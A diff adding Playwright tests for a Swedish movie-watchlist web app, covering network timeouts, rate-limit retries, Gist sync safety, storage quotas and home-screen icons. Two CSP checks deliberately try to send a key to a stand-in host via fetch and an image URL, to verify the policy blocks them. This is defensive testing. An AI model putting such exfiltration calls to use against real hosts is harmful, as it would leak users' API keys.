@@ -633,6 +633,84 @@ with sync_playwright() if False else __import__("playwright.sync_api", fromlist=
     # Säkerhet: sidan får inte skicka data till andra adresser än appens tjänster (Content-Security-Policy).
     csp = pg.evaluate("""async () => { try{ await fetch('https://example.com/stjal?k=1'); return 'skickades'; }catch(e){ return 'stoppad'; } }""")
     check(csp == "stoppad" and pg.locator("meta[http-equiv='Content-Security-Policy']").count() == 1, f"CSP stoppar anrop till okända adresser ({csp})")
+    # CSP: bilder får bara hämtas från affischvärdarna, så att en bildadress inte kan användas för att skicka iväg nycklar.
+    img = pg.evaluate("""() => new Promise(ok => {
+        const on = e => { if (e.blockedURI.includes('example.com')){ document.removeEventListener('securitypolicyviolation', on); ok(e.violatedDirective); } };
+        document.addEventListener('securitypolicyviolation', on);
+        new Image().src = 'https://example.com/stjal.gif?k=1'; setTimeout(() => ok('skickades'), 1500); })""")
+    check(img.startswith("img-src"), f"CSP stoppar bilder från okända adresser ({img})")
+
+    # Nätanrop: ett anrop som hänger avbryts med ett begripligt fel i stället för "Söker…" för evigt.
+    hung = []
+    pg.route(re.compile(r".*/3/movie/999001.*"), lambda route: hung.append(route))   # svarar aldrig
+    to = pg.evaluate("""async () => { NET_TIMEOUT = 300; try{ await tmdbGet('/movie/999001'); return 'svar'; }catch(e){ return e.message; } finally{ NET_TIMEOUT = 12000; } }""")
+    check(to == "Ingen kontakt med TMDB – försök igen.", f"nätanrop: tidsgräns ger begripligt fel ({to})")
+    for h in hung:
+        try: h.abort()
+        except Exception: pass
+    pg.unroute(re.compile(r".*/3/movie/999001.*"))
+    # 429 från TMDB: vänta Retry-After och försök en gång till.
+    n429 = []
+    def tmdb429(route):
+        n429.append(1)
+        if len(n429) == 1: return route.fulfill(status=429, body="{}", headers={"retry-after":"0.1", "access-control-allow-origin":"*"})
+        route.fulfill(status=200, body=json.dumps({"id":999002}), content_type="application/json", headers={"access-control-allow-origin":"*"})
+    pg.route(re.compile(r".*/3/movie/999002.*"), tmdb429)
+    r429 = pg.evaluate("tmdbGet('/movie/999002').then(r => r.id, e => e.message)")
+    check(r429 == 999002 and len(n429) == 2, f"nätanrop: 429 från TMDB försöks igen en gång ({r429}, {len(n429)} anrop)")
+    # RapidAPI: 429 när dygnets kvot är slut skiljs från för många anrop på kort tid.
+    sa429 = {"left": "0", "n": 0}
+    def sa_limit(route):
+        sa429["n"] += 1
+        route.fulfill(status=429, body="{}", headers={"access-control-allow-origin":"*", "retry-after":"0.1",
+            "access-control-expose-headers":"x-ratelimit-requests-remaining", "x-ratelimit-requests-remaining":sa429["left"]})
+    pg.route(re.compile(r"https://streaming-availability\.p\.rapidapi\.com/limit.*"), sa_limit)
+    u0 = pg.evaluate("store.get('usage', {n:0}).n")
+    m0 = pg.evaluate("sa('/limit', {}).then(() => 'ok', e => e.message)")
+    sa429["left"] = "7"
+    m1 = pg.evaluate("sa('/limit', {}).then(() => 'ok', e => e.message)")
+    u1 = pg.evaluate("store.get('usage', {n:0}).n")
+    check("i morgon" in m0 and "kort tid" in m1 and sa429["n"] == 4 and u1 - u0 == 4,
+          f"RapidAPI: dygnskvot och hastighetsbegränsning skiljs åt, nytt försök räknas ({m0} / {m1}, {sa429['n']} anrop, räknare +{u1 - u0})")
+
+    # Gist-synk: går synkfilen inte att läsa skrivs gisten inte över med bara den här enhetens markeringar.
+    writes = []
+    def gh_trunc(route):
+        r = route.request; h = {"access-control-allow-origin":"*"}
+        if r.method == "OPTIONS": return route.fulfill(status=204, headers={**h, "access-control-allow-headers":"*", "access-control-allow-methods":"*"})
+        if r.method in ("PATCH", "POST"): writes.append(1); return route.fulfill(status=200, body='{"id":"g1"}', content_type="application/json", headers=h)
+        route.fulfill(status=200, body=json.dumps({"files":{"nytt-att-se.json":{"truncated":True,"content":"{\"v\":1,\"ma",
+            "raw_url":"https://gist.githubusercontent.com/x/g1/raw/nytt-att-se.json"}}}), content_type="application/json", headers=h)
+    pg.route(re.compile(r"https://api\.github\.com/gists/g1$"), gh_trunc)
+    pg.route(re.compile(r"https://gist\.githubusercontent\.com/.*"), lambda route: route.fulfill(status=500, body="fel", headers={"access-control-allow-origin":"*"}))
+    sy = pg.evaluate("""async () => { store.set('gistId', 'g1'); marks['movie/999003'] = { status:'want', t:Date.now() };
+        await syncNow(); return [store.get('syncMsg', ''), store.get('gistId', null)]; }""")
+    check("Kunde inte läsa synkfilen" in sy[0] and not writes and sy[1] == "g1", f"synk: oläslig synkfil skrivs inte över ({sy[0]}, {len(writes)} skrivningar)")
+    pg.unroute(re.compile(r"https://api\.github\.com/gists/g1$"))
+    # GitHubs hastighetsbegränsning kallas inte "fel token", och gisten glöms inte.
+    pg.route(re.compile(r"https://api\.github\.com/gists/g1$"), lambda route: route.fulfill(status=403, body="{}",
+        headers={"access-control-allow-origin":"*", "access-control-expose-headers":"x-ratelimit-remaining", "x-ratelimit-remaining":"0"}))
+    sy = pg.evaluate("syncNow().then(() => [store.get('syncMsg', ''), store.get('gistId', null)])")
+    check("begränsar anropen" in sy[0] and sy[1] == "g1", f"synk: hastighetsbegränsning ger rätt text och gisten glöms inte ({sy[0]})")
+    pg.unroute(re.compile(r"https://api\.github\.com/gists/g1$"))
+    pg.evaluate("delete marks['movie/999003']; store.set('marks', marks)")
+
+    # Lagring: titeluppgifterna (meta) ligger i IndexedDB och gamla poster rensas.
+    me = pg.evaluate("""async () => { await metaReady; meta['movie/999004'] = { lang:'en', countries:[], sv:null, t:1 };
+        meta['movie/999005'] = { lang:'en', countries:[], sv:null, t:Date.now() }; saveMeta();
+        const db = await bigCache.get('meta');
+        return [localStorage.getItem('meta'), !!db['movie/999005'], 'movie/999004' in db, Object.keys(db).length]; }""")
+    check(me[0] is None and me[1] and not me[2], f"meta sparas i IndexedDB och poster äldre än 60 dagar rensas ({me})")
+    # Full lagring: markeringar som inte går att spara ger ett meddelande i stället för att tyst försvinna.
+    full = pg.evaluate("""() => { const orig = Storage.prototype.setItem; let omdbGone = false;
+        localStorage.setItem('omdb', '{}');
+        Storage.prototype.setItem = function(k, v){ throw new DOMException('full', 'QuotaExceededError'); };
+        store.warned = 0; const ok = store.set('marks', marks);
+        omdbGone = localStorage.getItem('omdb') === null;
+        Storage.prototype.setItem = orig; return [ok, omdbGone]; }""")
+    pg.wait_for_timeout(100)
+    check(full == [False, True] and "lagringen i webbläsaren är full" in pg.locator("#toast").inner_text(),
+          f"full lagring: cacher rensas och användaren får veta att markeringen inte sparades ({full})")
     pg.evaluate("closeSheets()")
     pg.evaluate("closeSheets()")
 
@@ -716,6 +794,13 @@ with sync_playwright() if False else __import__("playwright.sync_api", fromlist=
     sh.goto(INDEX); sh.wait_for_timeout(2500)
     check(sh.evaluate("$('detail').classList.contains('open') && $('detail').dataset.cur") == "movie/777", "dela: delning vid start öppnar titeln")
     b.close()
+
+# Hemskärmsikoner: PNG i 192 och 512 px, en maskable och en apple-touch-icon.
+man = json.loads((ROOT / "manifest.json").read_text())
+icons = {(i["src"], i.get("purpose", "any")) for i in man["icons"]}
+check({("icon-192.png", "any"), ("icon-512.png", "any"), ("icon-maskable-512.png", "maskable")} <= icons
+      and all((ROOT / f).exists() for f in ("icon-192.png", "icon-512.png", "icon-maskable-512.png", "icon-180.png"))
+      and 'rel="apple-touch-icon" href="icon-180.png"' in (ROOT / "index.html").read_text(), "manifest: PNG-ikoner och apple-touch-icon finns")
 
 print("JS-fel:" , [e for e in errs if e.startswith("JS")])
 sys.exit(1 if errs else 0)
